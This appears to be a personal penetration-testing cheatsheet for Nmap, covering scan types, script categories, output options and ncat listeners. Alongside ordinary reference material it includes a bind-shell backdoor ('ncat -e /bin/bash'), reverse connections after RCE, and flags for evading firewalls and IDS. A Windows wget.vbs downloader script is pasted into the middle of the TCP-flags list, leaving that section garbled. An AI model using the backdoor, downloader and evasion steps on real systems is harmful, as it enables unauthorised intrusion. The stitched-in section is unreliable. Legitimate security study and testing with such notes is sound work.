# Nmap Cheatsheet

Check [[Nmap-AllTheScripts]] for NSE scripts

**Nmap only supports Ethernet interfaces (including most 802.11 wireless cards and many VPN clients) for raw packet scans**. Unless you use the -sT -Pn options, RAS connections (such as PPP dialups) and certain VPN clients are not supported.

## Utility
```bash
-v  # verbosity level 1
-vv # verboseity level 2
-V  # version
-h	# help
-e $interface	# specify interface
```

## Target Syntax
```c
10.10.10.10	# single ip
10.10.10.10 11.11.11.11 # multiple ip
10.10.10.10,11  # octet list
10.10.10.10-225	# octet range
10.10.10.0/24	# entire subnet
```
Addition host specifying flags
```bash
nmap -iR $int	# random hosts
--exclude $target
--excludefile hosts.txt
-sL 			# list targets host of the network of a range or cidr range
-6				# IPv6 target(s)
```

# Scans 
```bash
nmap -sn				# Host discovery(NO PORT SCAN)
nmap -sS $IP 			# TCP SYN Scan    		
nmap -sT $IP 			# TCP Connect Scan        	
nmap -sU $IP 			# UDP Scan        		
nmap -sN $IP 			# TCP NULL Scan   		
nmap -sF $IP 			# TCP FIN Scan    		
nmap -sX $IP 			# Xmas Scan       		
nmap -sA $IP  			# TCP ACK Scan    		
nmap –scanflags [flags] $IP 	# Custom TCP Scan 		
nmap -sO $IP  			# IP Protocol Scan        	
nmap –send-eth $IP 		# Send Raw Ethernet Packets      
nmap –send-ip $IP 		# Send IP Packets
nmap -Pn 				# Non-Ping Scan
# If host drops ICMP packetsi(NO PING), skips host discovery
nmap -sP				# Ping Scan only
nmap -PS				# TCP SYN Ping Scan
nmap -PA				# TCP ACK Ping Scan
nmap -PU 				# UDP Ping Scan
nmap -PY				# SCTP INIT Ping 
nmap -PE				# ICMP ECho Ping Scan
nmap -PP				# ICMP Ping Scan
nmap -PM				# ICMP Address mask Ping Scan
nmap -PO 				# IP protocol ping
nmap -PR				# Arp Ping
```

## Packet Size
```bash
Default -sS sizeof 44 [20=ip_header,24=TCP_header] 
```

## Diagnostics and DNS
```bash
--traceroute	# Track packets with traceroute
-R				# Force Reverse DNS Resolution
-n 				# Disable Reverse DNS Resolution
-system-dns		# Alternative DNS Lookup
-dns-servers	# Manually Specify DNS Server(s)
-d  # debugging
--reason # display nmap's port state reason
--open 	# openness of ports put here as well as in ports section
--packet-trace  # trace packets
--iflist	# Display host networking 
```

## Analysis with tshark and iptables
[[Tshark]]: 
```bash
ifconfig | grep -C 2 $IP-MINUS-4TH-OCTET	# cp interface
$INTERFACE #=cp interface
tshark -i $INTERFACE
```

Iptables
```bash
iptables -I INPUT -s $IP -j ACCEPT
iptables -I OUTPUT -d $IP -j ACCEPT
iptables -Z # zero packet data
iptables -nv -L # scan tables
```

## Listeners and Client connections:
```bash
ncat -lvnp $PORT
ncat -u $IP $PORT # Connect to ncat udp listener
ncat -ulvnp $PORT # UDP listener
```

## Port
By default Nmap does not scan the ports in numerical order
```bash
-p #1,2 			# port listing
-p #0-65355			# port range
-p #servicename		# service name
-p ‘*’ 				# all ports
-p U:$ports T:$port	# by protocol
-p-					# all ports 
--open				# open
-top-ports 123		# Specify an arbitrary number of top ports to scan
-F 					# Fast scan scan only the 100 most common ports
-r 					# Perform a Sequential Port Scan
```

## Version Detection
```bash
-O		# OS scanning
–osscan-guess # Guess Unknown OS
-A 		# Aggressive Scan also performs -sC -sV
```

## Scripts
```bash
-sC		# default scripts
-sV		# Version Detection
-sV –version-trace # Troubleshoot versions
-sR 	# Perform a RPC Scan

--script-help= # Get information on a script
--script
--script auth
--script broadcast
--script brute
--script default
--script discovery
--script dos
--script exploit
--script external
--script fuzzer
--script intrusive
--script malware
--script safe
--script version
--script vuln

```

## Nmap ScriptGun 
```bash
dir=$(locate /nmap/scripts)
type=$1
for script in $(ls $dir | grep $type); do
	echo $script
	nmap --script $script $IP
	wait
done
exit
```

## Input
```bash
nmap -sn $IP | tee hostDiscoveryScan.txt
grep 'scan report' hostDiscoveryScan.txt | rev | cut -d " " -f1 | cut -d ")" -f2 | rev | cut -d "(" -f2 | tee IPList.txt
nmap -iL IPList.txt
```

## Outputing data
```bash
-oN		# output txt
-oX		# output xml
-oS		# output in leet
-oG		# output greppable
-oA		# output ALL
```

##  Scanflags for custom TCP flags
```bash
--scanflags lets you choose which flags you want to set.

URG # Urgent
ACK # Acknowledge
PSH # Push`echo strUrl = WScript.Arguments.Item(0) > wget.vbs   echo StrFile = WScript.Arguments.Item(1) >> wget.vbs   echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs   echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs   echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs   echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs   echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs   echo Err.Clear >> wget.vbs   echo Set http = Nothing >> wget.vbs   echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs   echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs   echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs   echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs   echo http.Open "GET",strURL,False >> wget.vbs   echo http.Send >> wget.vbs   echo varByteArray = http.ResponseBody >> wget.vbs   echo Set http = Nothing >> wget.vbs   echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs   echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs   echo strData = "" >> wget.vbs   echo strBuffer = "" >> wget.vbs   echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs   echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs   echo Next >> wget.vbs   echo ts.Close >> wget.vbs`
RST # Reset
SYN # Synchronize
FIN # Finish
```

## Firewall & IDS & IPS Evasion
```bash
# Evasion Approach                              Nmap Argument
-D DECOY1_IP1,DECOY_IP2,ME # Hide a scan with decoys 
-D RND,RND,ME			   # Hide a scan with random decoys
--proxies   # Use an HTTP/SOCKS4 proxy to relay connections PROXY_URL
--spoof-mac # Spoof source MAC address                        MAC_ADDRESS
-S IP_ADDRESS # Specify source IP address, not SPOOF!
-g PORT_NUM or --source-port PORT_NUM # Use a specific source port number               
-f	# Fragment IP data into 8 bytes
-ff # Fragment IP data into 16 bytes
--mtu VALUE # Fragment packets with given MTU
--data-length NUM # Specify packet length 
--ttl VALUE # Set IP time-to-live field 	
--ip-options OPTIONS # Send packets with specified IP options 
--badsum # Send packets with a wrong TCP/UDP checksum
-sI  # Zombie Scan
--source-port  # specify source port
--randomize-hosts  # random order
```

## Port Hopping
Have RCE on target AND ncat bin
Setup Listener on Attack box
```bash
ncat -lvnp $PORT
```
RCE back to listener:
```bash
ncat $IP $PORT
```
Cycle through the ports to enumerate firewall blacklisting. 
Use non blocked ports

## Port forward/tunneling/mapping

[[Port-Redirection-And-Tunnelling]], but with ncat
Defined as: Fowarding packet sent to one destination port to another destination port.
Either `-c` or `--sh-exec`
Target server should be replaced with local host
the `PORT` is the destination, `LISTENER` is the tunnel port firewall whitelisted 
```bash
ncat -lvnp $LISTENER -c "ncat TARGET_SERVER $PORT"
```

## Using Backdooring with non-standard ports
Create a backdoor via specified port 
Server Backdoor:
```bash
ncat -lvnp $LISTENER -e /bin/bash
```
On attackbox:
```bash
ncat $IP $PORT
```

## Manipulate Source TCP/UDP port
```lua
(-sS | -sT | -sU) -g $PORT
```
 ncat bypass IPS/IDS with just the right connection port or protocol
```bash
ncat -u $IP $PORT
ncat -ulvnp $PORT
```
Session splicing
```bash
-f 
-ff
-mtu
```

## Tricks
#### [Using Nmap to generate lists of IP addresses](https://github.com/droberson/rtfm/blob/master/rtfm.md#using-nmap-to-generate-lists-of-ip-addresses)

This is a mirror from [GitHub droberson/rtfm rtfm.md#using-nmap-to-generate-lists-of-ip-addresses](https://github.com/droberson/rtfm/blob/master/rtfm.md#using-nmap-to-generate-lists-of-ip-addresses)

- Sometimes a tool will not allow you use CIDR notation to express network addresses, or will require you to provide it a list of IP addresses. `nmap` provides the `-sL` (list scan) option that can generate these lists easily, complete with host and network exclusion, ranges, and so on:

```bash
nmap -n -sL 10.10.0.0/22 10.100.0.32/27 192.168.0.2-254 \
            --exclude 192.168.0.250,10.10.0.3.254       \
            | grep "Nmap scan report for"               \
            | awk {'print $5'}
```

- You can also omit the -n flag and easily resolve ranges of IP addresses. If an IP address resolves, it will display "hostname (ip address)". If it does not resolve, it will simply display the IP address:

```bash
nmap -sL 10.10.0.0/22 | awk {'print $5, $6'}
```

- Sometimes, you may need to use a different DNS server rather than whatever is in your `/etc/resolv.conf` to mass resolve a list of IPs:

```bash
nmap -n -sL 10.10.0.0/24      \
| grep "Nmap scan report for" \
| awk {'print $5'}            \
| while read ip; 
   do host $ip ALTERNATEDNSSERVERGOESHERE | grep "domain name pointer";
done
```

## References

[GitHub droberson/rtfm rtfm.md#using-nmap-to-generate-lists-of-ip-addresses](https://github.com/droberson/rtfm/blob/master/rtfm.md#using-nmap-to-generate-lists-of-ip-addresses)